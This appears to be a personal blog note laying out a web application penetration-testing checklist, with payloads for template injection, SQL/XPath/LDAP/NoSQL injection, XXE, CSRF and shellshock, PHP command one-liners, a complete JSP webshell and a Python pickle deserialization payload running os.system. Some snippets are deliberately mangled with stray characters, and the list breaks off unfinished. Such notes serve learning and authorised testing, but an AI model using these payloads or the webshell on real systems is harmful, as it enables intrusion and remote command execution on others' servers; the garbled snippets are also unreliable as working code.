---
title: Web Application Methodology
date: 2021-09-19
categories:
  - Notes
tags:
  - Web App
  - Notes
excerpt_separator: <!--more-->
toc: true
toc_sticky: true
---

<style>
  .fieldset
  {
      border:2px solid black;
      -moz-border-radius:8px;
      -webkit-border-radius:8px;	
      border-radius:8px;	
      font-size:12px;
      padding:10px;
      width:250px;
  }
  </style>

<h2 id="wtdvsawbapp">What to do vs a Web App</h2>

<ul>
    <li>check website is it php,asp or html</li>
    <li>check source code does it use cms</li>
    <li>Check robots.txt/sitemap.xml</li>
    <li>chech cert for useful info - subdomain?</li>
    <li>Gobuster dir and subdomain</li>
    <li>nikto</li>
    <li>Authorization vulns</li>
    <li>Code Injections? - can you control an input/data - eval(input)</li>
    <li>sqli? - https://www.hackingarticles.in/bypass-filter-sql-injection-manually/</li>
    <li>xxs?</li>
    <li>WIP</li>
    <li>SSRF</li>
    <li>phpmailer</li>
    <li>ruby - render -inline <%= `id %></li>
    <li>Server-side template injection - {{''.__class__.mro()[1].__subclasses__()[X](COMMAND)}} or {{url_for.__globals__.os.popen("id").read() }} or TPLMAP.py</li>
    <li>CSRF - <.img src="https://vulnerable-website/email/change?email=pwned@evil-user.net"> or tool=xsrfprobe</li>
    <li>xml entities - <!DOCTYP3 test [
      <!ENTITY x SYSTEM "file:///etxc/paxswd">]></li>
      <li>xpath - hacker']%00 or hacker' or 1=1]%00 --- ?name=hacker' or 1=1]/parent::*/child::node()%00&password=sdf</li>
      <li>objectinputstream- exploitation of a call to readObject - rO0 in cookie</li>
</ul>

<h2>ldap</h2>
<li>null bind - delete username&password data in body</li>
<li>ldap wildcard - adm*))%00</li>

<h2>mongodb</h2>
<li>injection? - hyst'|| 1==1 %00</li>


<h2>basic php oneliner</h2>
<code>php system($requests['hyst']); ?></code>
<code>?php system($_GET["cmd"]);?></code>
<code>?php print exec('command'); ?></code>



<h2>shellshock</h2>
<code>() { :;}; echo; `command`</code>
<p>echo to add a black space between headers and body output</p>

<h2>JWT</h2>
<p>header.data.signature - all in base64</p>
<p>set alg to None - remove signature </p>



<h2>apache and tomcat</h2>
<p>encoding of .. = %252e%252e</p>
<p>/manager/html</p>

<fieldset>
  
  <legend>webshell</legend>
  <pre><code>
    <.FORM METHOD=GET ACTION='index.jsp'>
    <.INPUT name='cmd' type=text>
    <.INPUT type=submit value='Run'>
    <./FORM>
    <%@ page import="java.io.*" %>
    <%
       String cmd = request.getParameter("cmd");
       String output = "";
       if(cmd != null) {
          String s = null;
          try {
             Process p = Runtime.getRuntime().exec(cmd,null,null);
             BufferedReader sI = new BufferedReader(new
    InputStreamReader(p.getInputStream()));
             while((s = sI.readLine()) != null) { output += s+"<./br>"; }
          }  catch(IOException e) {   e.printStackTrace();   }
       }
    %>
    <.pre><%=output %><./pre></code></pre>

      <p>remove dots after "<" save as .jsp</p>

</fieldset>

<h2>serialization</h2>
<h4>Python</h4>
<p>Pickle</p>

<fieldset>
  
  <legend>Python Serialization</legend>
  <pre><code>
    asdmport cPickle
    asdmport os
    
    asdclass Blah(object):
      def __reduce__(self):
        return (os.system,('command'.))'
    
    
    b = Blah()
    print cPickle.dumps(b)
    
  </code></pre>
</fieldset>

<li>run script</li>
<li>base64 encode result</li>
<li>replace server thingy</li>


<h2>xml</h2>
<p>https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xxe.md</p>



<h2>ECB Vuln</h2>

<fieldset>
  
  <legend>ECB ruby to decode</legend>
  <pre><code>
% irb
> require 'base64' ; require 'uri'
 => true
> Base64.decode64(URI.decode("OR9hcp18%2BC1bChK10NlRRg%3d%3d"))
 => "9\x1Far\x9D|\xF8-[\n\x12\xB5\xD0\xD9QF"
  </pre></code>

</fieldset>

<h2>lfi/rfi</h2>
<p>https://raghavtalwar4.gitbook.io/privilege-escalation-cheatsheet/owasp-top-10-and-more/lfi-rfi-cheatsheet</p>
g0tmilk
asd__import__('os').system('/bin/sh')asd  


<h2>.git - dump</h2>

<h2>command injection</h2>
<p>what to look for</p>
<li>app</li>